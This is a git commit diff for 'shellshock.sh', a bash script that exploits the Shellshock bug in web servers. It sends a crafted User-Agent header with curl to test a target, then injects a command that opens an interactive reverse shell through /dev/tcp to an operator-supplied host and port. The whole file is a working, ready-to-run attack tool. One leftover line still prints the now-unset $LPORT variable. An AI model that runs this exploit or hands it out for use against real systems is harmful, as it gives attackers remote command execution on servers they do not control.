6250ebbec96a6a34d83f74f2f9bf397940749562
Airán 'gurgui' Gómez <101645735+Gurguii@users.noreply.github.com>
2022-07-02 16:41:22 +0100

    Update shellshock.sh

--- shellshock.sh
+++ shellshock.sh
@@ -1,19 +1,27 @@
 #!/bin/bash
-if [[ -z "$1" || -z "$2" || -z "$3" ]]; then
-  printf "\nUsage: bash %s <url> <lhost> <lport>\n" "$0"
+url=""
+lhost=""
+lport=4444
+while getopts u:h:p: opt; do
+  case "$opt" in
+    u) url=${OPTARG};;
+    h) lhost=${OPTARG};;
+    p) lport=${OPTARG};;
+  esac
+done
+if [[ -z "$url" || -z "$lhost" ]]; then
+  printf "Usage: bash %s -u <url> -h <lhost> -p <lport>\n" "$0"
   exit 0
 fi
-url=$1
-LHOST=$2
-LPORT=$3
 printf "[?] Testing if target is vulnerable\n"
-if [[ -z $(curl -A "() { :;}; /bin/echo 'a'" -s "$url") ]]; then
+if [[ -z $(curl -A "() { :;}; ''" -s "$url") ]]; then
   printf "[!]Not vulnerable\n[-]Exiting...\n"
   exit 0
 fi
 printf "[+] Target vulnerable\n"
-if ! netstat -lt | grep -q "$LPORT"; then
+if ! netstat -lt | grep -q "$lport"; then
   printf "[!] You're not listening on port %s\n[+] Set it up and press enter" "$LPORT"
   read -r
 fi
-curl -A "() { :;}; /bin/bash -c /bin/bash -i >& /dev/tcp/$LHOST/$LPORT 0>&1 &" -s --output /dev/null "$url" && printf "[!] Check your listener\n"
+printf "[!] Sending reverse shell to %s port %s\n" "$lhost" "$lport"
+curl -A "() { :;}; /bin/bash -i >& /dev/tcp/$lhost/$lport 0>&1 &" -s --output /dev/null "$url"
